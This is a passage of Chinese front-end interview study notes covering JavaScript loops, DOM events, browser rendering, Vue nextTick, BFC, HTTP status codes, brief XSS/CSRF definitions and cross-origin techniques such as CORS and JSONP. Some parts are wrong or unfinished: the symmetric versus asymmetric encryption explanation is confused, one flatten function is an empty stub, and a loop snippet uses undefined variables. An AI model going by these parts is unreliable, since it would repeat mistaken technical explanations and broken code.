<li><strong>遍历是无序的</strong>，视浏览器而定，故在<strong>遍历数组时很可能是乱序的</strong>，所以不建议用于遍历数组，推荐<code>for of</code></li>
<li>上面讲到无序，其返回的顺序和Object.keys()、Object.values()的顺序一致；</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="number">1</span>,</span><br><span class="line">    b: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> o <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (o === <span class="string">"a"</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(o); <span class="comment">// a</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(arr.hasOwnProperty(i))&#123; </span><br><span class="line">	<span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="for…of"><a href="#for…of" class="headerlink" title="for…of"></a>for…of</h3><p>可迭代对象（包括 Array，Map，Set，String，TypedArray，arguments 对象等等）上创建一个迭代循环。</p>
<p>break, throw  continue    或return终止</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 只能用于数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> o <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(o); <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">if</span> (o === <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><p>不能使用break、continue和return语句</p>
<h2 id="DOM0和DOM2事件绑定"><a href="#DOM0和DOM2事件绑定" class="headerlink" title="DOM0和DOM2事件绑定"></a>DOM0和DOM2事件绑定</h2><h3 id="DOM0级绑定："><a href="#DOM0级绑定：" class="headerlink" title="DOM0级绑定："></a>DOM0级绑定：</h3><p>把一些常用的事件直接挂载在DOM的私有属性上，成为DOM0事件绑定：</p>
<p><code>target.onclick = function () {}</code></p>
<h3 id="DOM2级绑定"><a href="#DOM2级绑定" class="headerlink" title="DOM2级绑定"></a>DOM2级绑定</h3><p><code>target.addEventListener(&quot;fn name&quot;, fn, true/fasle)</code></p>
<p>DOM2级规定事件分为三个阶段：</p>
<ul>
<li>捕获阶段</li>
<li>处于目标阶段</li>
<li>冒泡阶段</li>
</ul>
<p><img src="https://static.simmzl.cn/dom2.png" alt="mark"></p>
<p>通过true/false，我们可以设定事件在捕获的阶段触发还是冒泡阶段的时候触发。</p>
<ul>
<li>true：捕获阶段时候触发</li>
<li>false： 冒泡阶段触发</li>
</ul>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数不需要显示的返回值。使用new来创建对象(调用构造函数)时，如果return的是非对象(数字、字符串、布尔类型等)会忽而略返回值;<br>如果return的是对象，则返回该对象(注：若return null也会忽略返回值）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">    <span class="comment">// return name // 忽略 &#123;name: 'Tom'&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Person(<span class="string">'Tom'</span>); <span class="comment">// &#123;&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p><code>use strict</code></p>
<h2 id="输入url到渲染的整个过程"><a href="#输入url到渲染的整个过程" class="headerlink" title="输入url到渲染的整个过程"></a>输入url到渲染的整个过程</h2><p>dns解析流程</p>
<h3 id="DOM-amp-CSSOM-gt-Render-Tree"><a href="#DOM-amp-CSSOM-gt-Render-Tree" class="headerlink" title="DOM &amp; CSSOM =&gt; Render Tree"></a>DOM &amp; CSSOM =&gt; Render Tree</h3><ul>
<li>url DNS查询到IP</li>
<li><p>从IP下载资源 80 443</p>
</li>
<li><p>浏览器将资源根据编码格式转成对应字符，再根据HTML5标准解析成对应标签对象。</p>
</li>
<li>根据这些对象去进行深度遍历，获取到它整个的<strong>DOM</strong>；（parse html）</li>
<li><p>在遍历遇到head中的link标签时，浏览器会下载这个资源，并解析，解析过程和解析html文件一样。最终生成一个<strong>CSS对象模型：CSSOM</strong>。</p>
</li>
<li><p>之后，浏览器会将DOM、CSSOM结合起来，构建<strong>渲染树 Render-tree</strong>，接下来是构建渲染树的过程：</p>
<ul>
<li><strong>遍历DOM</strong>每一个可见的节点（visibility:hidden只是视觉不可见但仍占位置，所以会遍历），一些script、display:none节点会忽略；</li>
<li>为每个可见的节点匹配对应的CSSOM的规则；</li>
<li>生成<strong>具有内容、样式的可见渲染树</strong>；</li>
</ul>
</li>
</ul>
<p>接下来进行<strong>layout布局，即reflow重排</strong>，计算位置和大小。</p>
<ul>
<li>浏览器<strong>从渲染树的根节点开始遍历</strong>，计算每个对象的位置、大小、形状，输出盒子模型，所有单位都转化为屏幕上的绝对像素px。</li>
</ul>
<p>最后，万事俱备，<strong>开始painting</strong>！我们就在viewport上看到了网页。</p>
<h3 id="脚本的执行"><a href="#脚本的执行" class="headerlink" title="脚本的执行"></a>脚本的执行</h3><p>当浏览器解析html遇到<code>&lt;script&gt;</code>标签时，DOM构建会暂停，直到脚本执行完毕。</p>
<p>因为解析器不知道js会对DOM做啥，所有会让js引擎编译执行脚本，直到脚本执行完毕后再继续构建DOM。所以，默认情况下，js一定会阻塞DOM构建的。</p>
<p>所以我们最后<strong>把script脚本放在<code>&lt;/body&gt;</code>以将脚本的阻塞降到最低</strong>。</p>
<p>在一些对DOM无操作的脚本上，我们可以异步加载脚本：在<code>&lt;script&gt;</code>上添加<code>async</code>关键字，告诉浏览器请继续构建DOM，异步的在脚本准备就绪后再执行脚本，不考虑脚本的依赖。比如谷歌分析、百度分析。</p>
<p>加<code>defer</code>关键字时，告诉浏览器，script加载和构建DOM是异步的，但script在DOM解析完毕，DOMContentLoaded事件触发前执行。这一点，和async不同。</p>
<p><img src="https://static.simmzl.cn/blog/2019-07-23-async%26defer.png" alt="async&amp;defer"></p>
<p>加defer的script标签有顺序，async无顺序。<br>dom构建完成，然后defer的脚本执行完后，触发DOMContentLoaded事件。</p>
<p>async脚本执行阶段可能DOMContentLoaded已经触发了。但是其执行完毕一定是在load之前的。</p>
<p><strong>动态添加脚本，其默认是async的</strong></p>
<p>讲解相当相当之好的文章：<a href="https://mp.weixin.qq.com/s/PNJ7xCTh15vtdFHWlDk5gw" target="_blank" rel="noopener">四步带你吃透浏览器渲染基本原理</a></p>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p><a href="https://blog.simmzl.cn/2018/08/cookie-localStroage-sessionStroage-indexDB-webSQL%E7%AE%80%E7%95%A5%E6%80%BB%E7%BB%93.html">cookie/localStroage/sessionStroage/indexDB/webSQL简略总结</a></p>
<h2 id="window的onload事件和domcontentloaded谁先谁后"><a href="#window的onload事件和domcontentloaded谁先谁后" class="headerlink" title="window的onload事件和domcontentloaded谁先谁后"></a>window的onload事件和domcontentloaded谁先谁后</h2><h2 id="数组扁平化、去重"><a href="#数组扁平化、去重" class="headerlink" title="数组扁平化、去重"></a>数组扁平化、去重</h2><p>扁平：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> flatten = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reduce(<span class="function">(<span class="params">prev,item</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> prev.concat(<span class="built_in">Array</span>.isArray(item) ? flatten(item) : item);</span><br><span class="line">    &#125;, []);</span><br><span class="line">&#125;</span><br><span class="line">flatten([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, [<span class="number">11</span>, <span class="number">12</span>, [<span class="number">12</span>, <span class="number">13</span>, [<span class="number">14</span>]]]], <span class="number">10</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flatten = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (arr.some()) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="typeof和instanceof的区别"><a href="#typeof和instanceof的区别" class="headerlink" title="typeof和instanceof的区别"></a>typeof和instanceof的区别</h2><p>它返回值是一个字符串，该字符串说明运算数的类型。（typeof 运算符返回一个用来表示表达式的数据类型的字符串。</p>
<p>instanceof是判断其构造函数的。</p>
<p><a href="https://www.cnblogs.com/Trr-984688199/p/6180040.html" target="_blank" rel="noopener">区别</a></p>
<h2 id="new和instanceof的内部机制"><a href="#new和instanceof的内部机制" class="headerlink" title="new和instanceof的内部机制"></a>new和instanceof的内部机制</h2><p><a href="https://juejin.im/post/5c19c1b6e51d451d1e06c163" target="_blank" rel="noopener">https://juejin.im/post/5c19c1b6e51d451d1e06c163</a></p>
<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>vue的响应式原理</p>
<h3 id="virtual-dom有哪些好处"><a href="#virtual-dom有哪些好处" class="headerlink" title="virtual dom有哪些好处"></a>virtual dom有哪些好处</h3><h3 id="父子组建传值-跨组建传值"><a href="#父子组建传值-跨组建传值" class="headerlink" title="父子组建传值/跨组建传值"></a>父子组建传值/跨组建传值</h3><p>父 - 子： props<br>子 - 父： emit</p>
<p>跨组件： eventbus &amp; vuex</p>
<h3 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h3><p><a href="https://blog.simmzl.cn/2019/06/Vuex&amp;Redux-Vuex.html">vuex</a></p>
<h3 id="vue的nextTick实现原理以及应用场景"><a href="#vue的nextTick实现原理以及应用场景" class="headerlink" title="vue的nextTick实现原理以及应用场景"></a>vue的nextTick实现原理以及应用场景</h3><p>Vue 在更新 DOM 时是异步执行的。只要侦听到数据变化，Vue 将开启一个队列，并缓冲在同一事件循环中发生的所有数据变更。</p>
<p>如果同一个 watcher 被多次触发，只会被推入到队列中一次。</p>
<p>避免不必要的计算和 DOM 操作。</p>
<p><strong>下一个的事件循环“tick”中，Vue 刷新队列并执行实际 (已去重的) 工作</strong>，这时候DOM的数据才改变完毕。Vue 在内部对异步队列尝试使用原生的 Promise.then、MutationObserver 和 setImmediate，如果执行环境不支持，则会采用 setTimeout(fn, 0) 代替。</p>
<p>正常都还好，但是如果<strong>你在更新数据后，想基于更新后的 DOM 状态来做点什么</strong>，这个时候你从DOM那边拿到的数据很可能是未改变的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#example'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'123'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">vm.message = <span class="string">'new message'</span> <span class="comment">// 更改数据</span></span><br><span class="line">vm.$el.textContent === <span class="string">'new message'</span> <span class="comment">// false // 数据未改变</span></span><br><span class="line">Vue.nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  vm.$el.textContent === <span class="string">'new message'</span> <span class="comment">// true // 数据已改变</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>$nextTick() 返回一个 Promise 对象，因此还可以这样：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  updateMessage: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.message = <span class="string">'已更新'</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el.textContent) <span class="comment">// =&gt; '未更新'</span></span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">this</span>.$nextTick()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el.textContent) <span class="comment">// =&gt; '已更新'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SSR对性能优化的提升在哪里"><a href="#SSR对性能优化的提升在哪里" class="headerlink" title="SSR对性能优化的提升在哪里"></a>SSR对性能优化的提升在哪里</h3><h3 id="Vue3-proxy解决了哪些问题"><a href="#Vue3-proxy解决了哪些问题" class="headerlink" title="Vue3 proxy解决了哪些问题"></a>Vue3 proxy解决了哪些问题</h3><h1 id="html-amp-css"><a href="#html-amp-css" class="headerlink" title="html &amp; css"></a>html &amp; css</h1><p>1</p>
<h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><h2 id="REM和EM"><a href="#REM和EM" class="headerlink" title="REM和EM"></a>REM和EM</h2><p>rem 1px 像素解决方案</p>
<p>物理像素 / 逻辑像素 = dpr (devicePixelRatio)卡，通过window.devicePixelRatio获取。</p>
<p>UI设计师<strong>要求的1px是指设备的物理像素1px</strong>，而CSS里记录的像素是逻辑像素。<br>在dpr = 2 的设备上，1px就表现为两个物理像素，就显得非常粗。</p>
<p>1、background &amp; svg 圆角不适用</p>
<p>postcss-write-svg插件</p>
<p>写好方法，传入px、border的位置（left、top、color）</p>
<p>2、1px不转rem, 用transform缩放0.5 圆角情况下用</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.setLeftLine</span>(<span class="variable">@c</span>: <span class="number">#C7C7C7</span>) &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">1px</span>; <span class="comment">/*!no*/</span></span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">1px</span> solid <span class="variable">@c</span>; <span class="comment">/*!no*/</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">@c</span>;</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>: scaleX(<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.setLine</span>(<span class="variable">@c</span>: <span class="number">#C7C7C7</span>) &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="variable">@c</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">@c</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">transform-origin</span>: left top;</span><br><span class="line">    <span class="attribute">transform</span>: scale(<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>动态的改变viewport的缩放比例和rem根字体大小以及媒体查询之类因为兼容性问题和涉及全局可能会带来其他影响就没有考虑。</p>
<h2 id="BFC什么是什么情况下bfc"><a href="#BFC什么是什么情况下bfc" class="headerlink" title="BFC什么是什么情况下bfc"></a>BFC什么是什么情况下bfc</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>块格式化上下文 (Block Formatting Context)</p>
<p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素的属性不会影响到外面元素，只在这个BFC内；两个BFC之间不会产生任何影响</p>
<h3 id="如何产生BFC"><a href="#如何产生BFC" class="headerlink" title="如何产生BFC"></a>如何产生BFC</h3><p>下面情况会产生BFC：</p>
<ul>
<li>float的值不为none</li>
<li>overflow的值不为visible</li>
<li>display的值为table-cell, table-caption, inline-block中的任何一个</li>
<li>position的值不为relative和static</li>
</ul>
<p>简单说，就是CSS3触发BFC就是让定位不是正常的，不是static、relative。</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul>
<li>内部的Box会在垂直方向上一个接一个的放置</li>
<li>完整的说法是：属于同一个BFC的两个相邻Box的margin会发生重叠（塌陷），与方向无关。）</li>
<li>每个元素的左外边距与包含块的左边界相接触，BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界</li>
<li>BFC的区域不会与float的元素区域重叠，所以为了让浮动子元素不与外界重叠，我们就可以用这个特性来实现清楚浮动了。</li>
<li>计算BFC的高度时，浮动子元素也参与计算，同样，可以解决父级高度塌陷的问题。</li>
<li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然</li>
</ul>
<p>看到以上的几条约束，想想我们学习css时的几条规则</p>
<p>Block元素会扩展到与父元素同宽，所以block元素会垂直排列<br>垂直方向上的两个相邻DIV的margin会重叠，而水平方向不会(此规则并不完全正确)<br>浮动元素会尽量接近往左上方（或右上方）<br>为父元素设置overflow：hidden或浮动父元素等，则会包含浮动元素</p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>1、 比如说两个元素发生margin重叠，我们让他们其中一个元素a 的display为inline-block，或者a浮动，这时候a就是一个BFC，这样他就不会和另一个元素发生作用。</p>
<p>在发生margin重叠的时候（只要上下相邻，中间没有其他元素，如兄弟之间、父子的上面或下面等，margin重叠只发生在垂直方向。），使用：</p>
<ul>
<li>padding代替</li>
<li>之一display: inline-block  // 产生BFC</li>
<li>之一设置重叠的元素浮动  // 产生BFC</li>
<li>给其中一个元素包个父级div，并设置overflow: hidden / display: inline-block，这样这个父级就是一个BFC，不会影响</li>
</ul>
<p>2、清除内部浮动</p>
<p>计算BFC的高度时，浮动元素也参与计算，因此可设置父级元素overflow/display/float/position达到目的。</p>
<p>3、BFC布局规则第五条：</p>
<p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</p>
<p>因为BFC内部的元素和外部的元素绝对不会互相影响，因此，</p>
<p>当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。 同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。 避免margin重叠也是这样的一个道理。 </p>
<h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><h3 id="贝塞尔曲线"><a href="#贝塞尔曲线" class="headerlink" title="贝塞尔曲线"></a>贝塞尔曲线</h3><h3 id="选择器相关，优先级"><a href="#选择器相关，优先级" class="headerlink" title="选择器相关，优先级"></a>选择器相关，优先级</h3><p><img src="https://static.simmzl.cn/blog/2019-07-24-css.png" alt="选择器"></p>
<p><a href="https://blog.csdn.net/konghouy/article/details/80875641" target="_blank" rel="noopener"></a></p>
<h3 id="css动画实现"><a href="#css动画实现" class="headerlink" title="css动画实现"></a>css动画实现</h3><p><a href="http://www.w3school.com.cn/css3/css3_animation.asp" target="_blank" rel="noopener">css动画</a></p>
<p>animation</p>
<p>关键帧 @keyframe</p>
<h2 id="回流-amp-重回"><a href="#回流-amp-重回" class="headerlink" title="回流 &amp; 重回"></a>回流 &amp; 重回</h2><p>回流（reflow）<br>只要修改了dom或改变了元素的形状或大小等会改变布局的操作就会触发reflow</p>
<p>重绘（repaint）<br>只是改变了颜色，不影响周围元素或布局，会引起浏览器的重绘</p>
<p>减少reflow与repaint<br>不要一条一条的修改样式，应该固定写一个class，更换className，减少reflow次数</p>
<p>不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。</p>
<p>为动画的 HTML 元件使用position:fixed 或 absolute ，那么修改他们的 CSS 是不会 reflow 的。</p>
<p>避免使用table布局，一个很小的改动会造成整个table reflow！</p>
<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="https和http"><a href="#https和http" class="headerlink" title="https和http"></a>https和http</h2><p>Http请求中的keep-alive有了解吗</p>
<p><a href="https://blog.csdn.net/xiaoming100001/article/details/81109617" target="_blank" rel="noopener">HTTP和HTTPS协议，看一篇就够了</a></p>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><a href="https://www.cnblogs.com/xflonga/p/9368993.html" target="_blank" rel="noopener">常见的http状态码</a><br><a href="https://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">文档</a></p>
<p>1XX系列响应代码仅在与HTTP服务器沟通时使用。<br>100(“Continue”)</p>
<p>2XX系列响应代码表明操作成功了。<br>200(“OK”)<br>201(“Created”)服务器依照客户端的请求创建了一个新资源时，发送此响应代码<br>204(“No Content”)</p>
<p>3XX 重定向<br>3XX系列响应代码表明：客户端需要做些额外工作才能得到所需要的资源。它们通常用于GET请求。他们通常告诉客户端需要向另一个URI发送GET请求，才能得到所需的表示。那个URI就包含在Location响应报头里。<br>304(“Not Modified”)</p>
<p>4XX客户端错误<br>401(“Unauthorized”)<br>403(“Forbidden”)<br>405(“Method Not Allowd”)<br>408(“Reqeust Timeout”)</p>
<p>5XX服务器错误</p>
<p>502(“Bad Gateway”)  只有HTTP代理会发送这个响应代码。它表明代理方面出现问题，或者代理与上行服务器之间出现问题，而不是上行服务器本身有问题。若代理根本无法访问上行服务器，响应代码将是504。</p>
<p>503(“Service Unavailable”)<br>此响应代码表明HTTP服务器正常，只是下层web服务服务不能正常工作。最可能的原因是资源不足：服务器突然收到太多请求，以至于无法全部处理。由于此问题多半由客户端反复发送请求造成，因此HTTP服务器可以选择拒绝接受客户端请求而不是接受它，并发送503响应代码。<br>响应报头：服务器可以通过Retry-After报头告知客户端何时可以重试。</p>
<p>504(“Gateway Timeout”)<br>跟502类似，只有HTTP代理会发送此响应代码。此响应代码表明代理无法连接上行服务器。</p>
<h2 id="xss和csrf"><a href="#xss和csrf" class="headerlink" title="xss和csrf"></a>xss和csrf</h2><p>XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
<p><strong>在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！</strong></p>
<p>CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>
<p><strong>冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</strong></p>
<p>xss的话主要使用转义，csrf的话项目中我主要使用的是jwt(javascript web token)。然后针对jwt细节问了我20多分钟。</p>
<h2 id="对称加密与非对称加密"><a href="#对称加密与非对称加密" class="headerlink" title="对称加密与非对称加密"></a>对称加密与非对称加密</h2><p>对称：客户端用服务器的公钥加密一个随机密钥，然后加密明文，服务器拿到密文后用自己的私钥解密</p>
<p>非对称：双方都有公钥私钥，公钥由可信任的第三方维护，都可以获取到。客户端用服务端的公钥加密明文，然后服务器用自己的私钥解密。</p>
<h2 id="进程-amp-线程"><a href="#进程-amp-线程" class="headerlink" title="进程 &amp; 线程"></a>进程 &amp; 线程</h2><p>进程就是一次程序执行的过程，操作系统分配资源的最小单位。</p>
<p>线程就是程序执行的最小单位，一个进程包含多个线程。</p>
<p>进程彼此相互独立，不共享资源内存。而线程则会。</p>
<p>js是单线程。<br>chrome每个网页都是一个独立的进程，用空间换取速度。这样一个网页崩溃不会造成所有的网页崩溃。</p>
<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>需要浏览器和服务器同时支持</p>
<p>服务端开启Access-Control-Allow-Origin添加允许的域名。</p>
<p>为 <em> 会造成一些安全问题，允许其他域名访问后端接口。<br>为 </em> 会使浏览器不会携带cookies，服务端通过access-control-allow-credentials为true，去接受cookies，默认开启。客户端通过XHR的withCredentials为true让请求带cookies</p>
<p>请求也会分为简单请求和非简单请求。</p>
<p>简单即满足以下两点：</p>
<p>1、get/post/head请求之一；<br>2、http请求头不超出以下几个字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
<p>否则为非简单。</p>
<p>非简单的话，浏览器会发送一个预检（preflight）请求，相当于想问问服务器，你支不支持我这个请求。</p>
<p>预检请求是一个OPTINOS请求，特征是在请求头加了三个字段：</p>
<ul>
<li>origin：本次请求的域名地址，告诉服务器，这个域名你支不支持～</li>
<li>Access-Control-Allow-Method：POST，正式请求的方法，问一问服务器你到底支持哪些；</li>
<li>Access-Control-Request-Headers：content-type, x-requested-with；告诉服务器，正式请求会额外发送的请求头。</li>
</ul>
<p>服务器在检查Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求之后返回回应。<br>如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。会触发被XHR onerror事件捕获。</p>
<p>若允许，则在该响应头中，会在Access-Control-Allow-Origin这个字段中带上服务器允许的地址。其中还包括：</p>
<ul>
<li>ccess-Control-Allow-Methods: GET, POST, PUT</li>
<li>Access-Control-Allow-Headers: X-Custom-Header</li>
<li>Access-Control-Allow-Credentials: true</li>
<li>Access-Control-Max-Age: 1728000  用来指定本次预检请求的有效期。会缓存这条回应，在此期间不用发出另一条预检请求。</li>
</ul>
<h3 id="图像ping"><a href="#图像ping" class="headerlink" title="图像ping"></a>图像ping</h3><p>利用Image对象没有同源限制的原理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.onload = img.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">"done"</span>) &#125;;</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"https://xx?form=index"</span></span><br></pre></td></tr></table></figure>
<p>常用于用户点击次数埋点、广告曝光次数等。</p>
<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="javascript">   script.type = <span class="string">'text/javascript'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="comment">// 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数</span></span></span><br><span class="line"><span class="javascript">   script.src = <span class="string">'http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback'</span>;</span></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.head.appendChild(script);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="comment">// 回调执行函数</span></span></span><br><span class="line"><span class="javascript">   <span class="function"><span class="keyword">function</span> <span class="title">handleCallback</span>(<span class="params">res</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">       alert(<span class="built_in">JSON</span>.stringify(res));</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端返回：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">handleCallback(&#123;<span class="string">"status"</span>: <span class="literal">true</span>, <span class="string">"user"</span>: <span class="string">"admin"</span>&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="postMessage跨域"><a href="#postMessage跨域" class="headerlink" title="postMessage跨域"></a>postMessage跨域</h3><p>HTML5</p>
<p>用法：postMessage(data,origin)方法接受两个参数</p>
<p>data： html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。</p>
<p>origin： 协议+主机+端口号，也可以设置为”*”，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p>
<p>1、a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p>
